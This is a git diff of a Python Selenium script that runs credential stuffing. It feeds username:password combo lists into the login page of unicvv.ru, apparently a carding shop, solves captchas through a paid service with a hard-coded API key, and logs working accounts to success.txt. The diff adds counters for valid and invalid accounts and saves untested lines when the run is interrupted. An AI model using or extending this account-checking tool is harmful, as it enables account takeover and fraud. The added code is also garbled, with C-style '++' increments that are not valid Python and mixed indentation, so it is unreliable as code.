@@ -15,12 +15,12 @@ import random
 
 chrome_driver = "chromedriver.exe"
 
-api_key = '3ba305baf09547c8306b29374779e0aa'
+api_key = '4f1e2a5c992e69a37847d3ab36437c2e'
 
 WebSite_Url = 'https://unicvv.ru/'
 
 
-txt_files = ["UNICCUP7.txt","UNICCUP10.txt","UNICCUP4.txt","UNICCUP5.txt","UNICCUP6.txt","UNICCUP9.txt"]
+txt_files = ["UNICCUP4.txt","UNICCUP5.txt","UNICCUP6.txt","UNICCUP7.txt","UNICCUP9.txt","UNICCUP10.txt"]
 
 
 def generate_random_string(size=6, chars=string.ascii_uppercase + string.digits):
@@ -62,6 +62,9 @@ def solve_captcha(img_file_path):
 # Using readline() 
 
 count = 0
+secuss  = 0
+failed_captcha = 0
+invalid_captcha = 0
 striped_line = None
 
 try:
@@ -75,7 +78,10 @@ try:
         for line in alllines:
             count = count + 1
             striped_line = line.strip()
-
+            print("LIne: " + str(count))
+            print("Valid Accounts: " + str(secuss))
+            print("INValid Accounts: " + str(invalid_captcha))
+            print("InValid Captcha: " + str(failed_captcha))
             print("Current line: " + striped_line)
 
             Splitted_Line = striped_line.split(":")
@@ -149,11 +155,13 @@ try:
             print(len(captcha_err_message))
             if len(element) > 0:
                 print("incorrect username or password!")
+                invalid_captcha++
             
 
             #captcha_err_message = browser.find_element_by_id("LoginForm_captcha_em_")
             elif len(captcha_err_message) > 0:
                 print("Incorrect Captcha!")
+                failed_captcha++
                 print("SAVING IN "+remaining_txt_file+" FILE..")
                 
                 file123 = open(remaining_txt_file, 'a') 
@@ -164,8 +172,9 @@ try:
                 file12 = open('success.txt', 'a') 
                 file12.write(line + "\n") 
                 file12.close()
+                secuss++
                 
-
+            count++
             # Writing to a file
             alllines.remove(line)
             browser.quit()
@@ -177,6 +186,16 @@ except Exception as e:
     for lin3 in alllines:
         lin3 = lin3.strip()
         file12.write(lin3 + "\n")
+
+except KeyboardInterrupt:
+	saving_txt_file = 'remaining_accounts_'+ generate_random_string() +'.txt'
+    file12 = open(saving_txt_file, 'a')
+    for lin3 in alllines:
+        lin3 = lin3.strip()
+        file12.write(lin3 + "\n")
+
+    sys.exit(0)
+
 
     file12.close()
     file1.close() 
